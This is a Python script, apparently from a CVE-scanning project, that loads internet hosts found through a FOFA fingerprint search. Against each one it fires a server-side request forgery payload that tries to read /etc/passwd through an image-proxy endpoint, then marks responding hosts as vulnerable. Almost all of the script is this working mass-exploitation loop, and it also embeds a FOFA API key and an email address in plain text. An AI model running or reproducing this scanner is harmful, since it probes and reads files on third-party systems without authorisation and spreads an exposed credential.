from src.api.query_fofa import FOFA
import pandas as pd
import os
from src.utils import Logger, requests_url
from tqdm import tqdm

logger = Logger(level="ERROR")
if __name__ == '__main__':
    key = '4ac7e56c095cf0b70d68eaf8ad81178a'  # 输入key
    email = '15723051314@163.com'
    search_str = "body='/Base/BaseHandler.ashx'"
    url_path = "/api/proxy/image?url=file:///etc/passwd"
    # fofa_obj = FOFA(email=email, key=key)
    # result = fofa_obj.search(search_str, output_path=r"E:\kali_python\furate-cve\tests\url.csv")
    result = pd.read_csv(r"E:\kali_python\furate-cve\tests\url.csv")
    result["is_vuln"] = 0

    country_name_group = result.groupby('country_name')
    for country, urls in country_name_group:
        for index in tqdm(urls.index, desc=country, total=urls.shape[0]):
            url_info = urls.loc[index, :]
            if "://" in url_info['host']:
                url = f"{url_info['host']}/"
            else:
                url = f"{url_info['protocol']}://{url_info['host']}/"
            try:
                response = requests_url(url + url_path, timeout=3)
            except Exception:
                continue

            if response.status_code == 200:
                result.loc[index, "is_vuln"] = 1
    result.to_csv(r"E:\kali_python\furate-cve\tests\url.csv", index=False)